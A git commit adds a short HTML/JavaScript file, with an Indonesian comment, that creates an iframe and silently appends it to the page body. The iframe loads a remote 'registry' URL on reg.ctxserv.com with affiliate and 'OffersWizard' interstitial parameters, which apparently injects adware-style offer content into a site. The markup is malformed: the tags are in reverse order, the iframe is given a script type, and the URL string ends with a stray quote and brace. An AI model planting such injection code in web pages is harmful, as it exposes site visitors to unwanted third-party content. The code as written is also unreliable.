4dd57e86a9c45639ca2950f7002a283b22266563
Muhammad_Adi_Nugroho <adi.go.rich@gmail.com>
2015-10-08 00:37:50 +0700

    Create lbxctxjs.js

---
+++ lbxctxjs.js
@@ -0,0 +1,23 @@
+-Perhatikan, di line 16 paragraph src, tanda kutip di Kanan, satu yang di dalam:
+<body>
+<head>
+<html>
+
+<script>
+
+
+{
+var c=document.createElement("iframe");
+
+c.setAttribute("type","text/javascript");
+
+c.setAttribute("src","http://reg.ctxserv.com/scjs/ctxjs/registry.php?nc=1&amp;scjsaffid=775&amp;subaff=14698&amp;brand=OffersWizard&amp;intrstcial=lbx&amp;c=WW&amp;oc=ID&amp;pr=0'};");
+
+document.body.appendChild(c)
+}
+
+</script>
+
+</html>
+</head>
+</body>
